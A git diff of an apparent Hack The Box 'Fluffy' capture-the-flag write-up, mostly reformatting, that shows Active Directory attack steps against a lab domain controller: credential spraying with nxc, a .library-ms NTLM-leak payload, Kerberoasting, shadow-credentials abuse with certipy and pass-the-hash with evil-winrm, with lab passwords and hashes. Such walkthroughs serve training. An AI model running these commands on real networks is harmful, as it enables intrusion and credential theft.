@@ -110,8 +110,7 @@ With each port we find above, I try to enumerate and exploit but nothing is inte
 It takes me amount of time to realize that: The Fluffy box itself provides us credential for the following account: **j.fleischman | J0elTHEM4n1990!** :)
 
 ## P2 & A1
-Okey now we will try that credential in anywhere which require authentication<br>
-First of all, try with **SMB service**. I usually use **nxc** tool (or **crackmapexec**) to check whether a credential works on a service.
+Okey now we will try that credential in anywhere which require authentication. First of all, try with **SMB service**. I usually use **nxc** tool (or **crackmapexec**) to check whether a credential works on a service.
 ```
 └─$ nxc smb 10.129.62.147 -u j.fleischman -p J0elTHEM4n1990!  
 SMB         10.129.62.147   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -155,7 +154,8 @@ In here, I find an interesting pdf file name **Upgrade_notice.pdf**. This file l
 ![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_07-43.png){: w="700" }
 
 Before deep dive in it, we need to understand how it works first:<br>
-This CVE means we create a **.library-ms** file. This file has XML format and it has a tag name **simpleLocation**. We can define an SMB url (for example) as a value for that tag. Then we create a zip archive containing the **.library-ms** file we have just created above and find a way to put it on the target. If someone on target extract the zip file, the Windows Explorer automatically parses the content of **.library-ms**. It find that "Oh SMB url, call it right now" and call directly to SMB url and attach the NTMLv2 hash to the attacker's url.
+
+*This CVE means we create a **.library-ms** file. This file has XML format and it has a tag name **simpleLocation**. We can define an SMB url (for example) as a value for that tag. Then we create a zip archive containing the **.library-ms** file we have just created above and find a way to put it on the target. If someone on target extract the zip file, the Windows Explorer automatically parses the content of **.library-ms**. It find that "Oh SMB url, call it right now" and call directly to SMB url and attach the NTMLv2 hash to the attacker's url.*
 
 ```
 └─$ cat payload.library-ms 
@@ -345,7 +345,7 @@ ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  202
 [-] CCache file is not found. Skipping...
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
-The error KRB_AP_ERR_SKEW(Clock skew too great) occurs because the time difference between our attacking machine and the target domain controller (DC) exceeds 5 minutes (300 seconds). Kerberos strictly requires the client and server clocks to be synchronized to prevent replay attacks
+*The error KRB_AP_ERR_SKEW(Clock skew too great) occurs because the time difference between our attacking machine and the target domain controller (DC) exceeds 5 minutes (300 seconds). Kerberos strictly requires the client and server clocks to be synchronized to prevent replay attacks*
 ```
 └─$ sudo timedatectl set-ntp off
 └─$ sudo rdate -n 10.129.62.147
@@ -368,22 +368,24 @@ $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$fc1ead87a213b0da1b7bc9aca9b636
 Good, now try hashcat with hope that we can findout the password of user **ca_svc** but....nothing happens :(<br>
 
 We need to change our thinking to other methods. I try to search on Google to find anything related to **GenericWrite** abuse and fortunately: **Shadow Credentials** saves my life. Anyway, we need to understand what is Shadow Credentials attack and how it works behind the scence.<br>
-First, we talk about **PKINIT**: *PKINIT (Public Key Cryptography for Initial Authentication) is an extension to the Kerberos protocol. The traditional Kerberos initial authentication relies on a password-derived key, while PKINIT allows the use of public key cryptography (such as smart cards or certificates) to complete the initial authentication and obtain a Ticket Granting Ticket (TGT).*<br>
-It means, normally to authenticate with Kerberos we must use either NTLM hash or scret key but now, with the help of PKINIT, we can use a public key cryptography to achive the similar purpose.
+
+First, we need to talk about **PKINIT**: <br>
+*PKINIT (Public Key Cryptography for Initial Authentication) is an extension to the Kerberos protocol. The traditional Kerberos initial authentication relies on a password-derived key, while PKINIT allows the use of public key cryptography (such as smart cards or certificates) to complete the initial authentication and obtain a Ticket Granting Ticket (TGT).*<br>
+**It means, normally when authenticating with Kerberos we must use either NTLM hash or scret key but now, with the help of PKINIT, we can use a public key cryptography to achive the similar purpose.**
 
 *This is how PKINIT works behind the scence:*
 - The client possesses a private key (usually stored in a TPM or smart card) and sends an authentication request signed with the private key to the domain controller (KDC).
 - The KDC looks up the corresponding public key in the **msDS-KeyCredentialLink** attribute of the account.
 - The KDC verifies the signature using the public key, and if successful, issues a TGT
 
-Relies on above flow, we find one weak point here *The KDC looks up the corresponding public key in the msDS-KeyCredentialLink attribute of the account*. If we can insert our fake public key to **msDS-KeyCredentialLink** attribute of account target, yes of course, we can authenticate as the account target.
+**Relies on above flow, we find one weak point here "*The KDC looks up the corresponding public key in the msDS-KeyCredentialLink attribute of the account*". If we can insert our fake public key to **msDS-KeyCredentialLink** attribute of account target, yes of course, we can authenticate as the account target.**
 
 As we discuss above, firstly we will add **p.agila** to group **Service Accounts**:
 ```
 └─$ bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.129.62.147 add groupMember "service accounts" "p.agila"
 [+] p.agila added to service accounts
 ```
-Then, by using **certipy** we can insert our public key to **msDS-KeyCredentialLink** attribute of **winrm_svc**:
+Then, by using **certipy** we can insert our public key to **msDS-KeyCredentialLink** attribute of **winrm_svc** (through **GenericWrite**):
 ```
 └─$ certipy shadow -account winrm_svc -dc-ip 10.129.62.147 -u p.agila -p prometheusx-303 add                              
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -425,7 +427,7 @@ Wait a minute, I want to explain a little bit why we can achive hash for **winrm
 ```
 Evil-WinRM* PS C:\users\winrm_svc\Desktop> type user.txt
 ```
-## P3 & P4
+## P3 & A1
 Similarly, we can easily findout the NLTM hash of **ca_svc**. Then we need to basic enumerate for ADCS:
 ```
 └─$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -vulnerable -stdout
@@ -536,6 +538,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
+## P4 & A4
 Again, use **ptH** and read the root flag:
 ```
 └─$ evil-winrm -i 10.129.62.147 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
